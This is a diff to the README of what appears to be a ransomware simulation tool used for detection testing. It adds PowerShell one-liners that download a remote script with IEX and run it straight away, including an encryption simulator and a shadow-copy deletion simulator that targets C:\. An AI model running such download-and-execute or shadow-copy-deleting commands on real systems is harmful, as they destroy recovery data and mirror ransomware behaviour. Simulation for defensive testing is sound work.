@@ -16,7 +16,7 @@ Decryption -
 
 PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-RansomSIM.ps1");Invoke-RansomSIM -Mode Decrypt -Path 'C:\Users\tester\Documents\Test';
 
-# Bonus
+# AutoIt
 An autoIt script - you may compile it to an executable using Aut2Exe, or execute it using the interpreter (encrypts only .doc files)
 
 **Example:**
@@ -29,4 +29,12 @@ Decryption -
 
 RansomSIM.exe /decrypt C:\
 
+# Simulator for shadow copy manipulation
+an aggregation of technique as implemented by ransomware groups to delete shadow copies, usually is performed before the ransomware encryption
+
+Example ('All','VssDeleteAll', 'WmiDeleteAll', 'VssResize', 'DeleteEach', 'CimDelete', 'NativeDelete'):
+
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-ShadowDeleteSIM"); Invoke-ShadowDeleteSIM -Mode All -Volume 'C:\\'
+
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-ShadowDeleteSIM"); Invoke-ShadowDeleteSIM -Mode VssDeleteAll -Volume 'C:\\'
 
